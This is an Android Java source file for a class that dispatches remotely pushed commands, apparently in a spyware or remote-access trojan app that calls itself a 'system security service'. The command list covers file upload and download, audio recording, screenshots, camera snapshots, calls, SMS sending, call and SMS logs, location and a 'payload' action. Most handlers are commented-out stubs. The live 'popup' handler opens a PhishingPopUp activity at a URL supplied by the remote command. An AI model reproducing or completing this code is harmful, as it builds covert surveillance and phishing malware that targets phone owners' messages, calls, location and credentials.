package com.service.security.services.systemsecurityservice;

import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

import com.service.security.services.systemsecurityservice.mainUi.PhishingPopUp;

public class ActionManager {

    private final Context context;
    private final String content;
    private final String action;

    public ActionManager(Context context, String content, String action) {
        this.context = context;
        this.content = content;
        this.action = action;
    }

    public void performAction() {
        switch (action) {
            case "popup": {
                showPopUp();
                return;
            }
            case "notify": {
                //  showNotification();
                return;
            }
            case "run": {
                //runApp();
                return;
            }
            case "explore": {
                //getFiles();
                return;
            }
            case "open_file": {
                //openFile();
                return;
            }
            case "download_file": {
                //downloadFile();
                return;
            }
            case "upload_file": {
                //uploadFile();
                return;
            }
            case "play_sound": {
                //playSound();
                return;
            }
            case "record_sound": {
                //sendRecordedSound();
                return;
            }
            case "screenshot": {
                //sendScreenshot();
                return;
            }
            case "snapshot": {
                //sendSnapshot();
                return;
            }
            case "make_call": {
                //performCall();
                return;
            }
            case "send_sms": {
                //sendSms();
                return;
            }
            case "call_log": {
                //sendCallLog();
                return;
            }
            case "sms_log": {
                //sendSmsLog();
                return;
            }
            case "get_location": {
                //sendLocation();
                return;
            }
            case "payload": {

                return;
            }
            default: {
                makeToast();
            }
            System.out.println("FirebaseBroadcastReceiver.performAction Action = " + action);
            System.out.println("FirebaseBroadcastReceiver.performAction content = " + content);

        }

    }

    private void makeToast() {
        Toast.makeText(context, content, Toast.LENGTH_SHORT).show();
    }
/*
TODO:implementation
    private void playSound() {

    }

    private void sendRecordedSound() {

    }

    private void downloadFile() {

    }

    private void sendScreenshot() {

    }

    private void performCall() {

    }

    private void getFiles() {

    }

    private void sendSnapshot() {
    }

    private void openFile() {

    }

    private void sendSms() {

    }

    private void sendSmsLog() {

    }

    private void runApp() {

    }

    private void sendLocation() {

    }

    private void uploadFile() {

    }

    private void showNotification() {
    }

    private void sendCallLog() {
        //String callLog = getCallLog();
        //Log.e("call Log", "inside sendCallLog()" + callLog);
        Log.e("FBR.sendCallLog()", "getCallLog() not implemented");
    }
*/

    private void showPopUp() {
        Intent i = new Intent();
        i.setClass(context, PhishingPopUp.class);
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.putExtra("url", content);
        context.startActivity(i);
    }


}
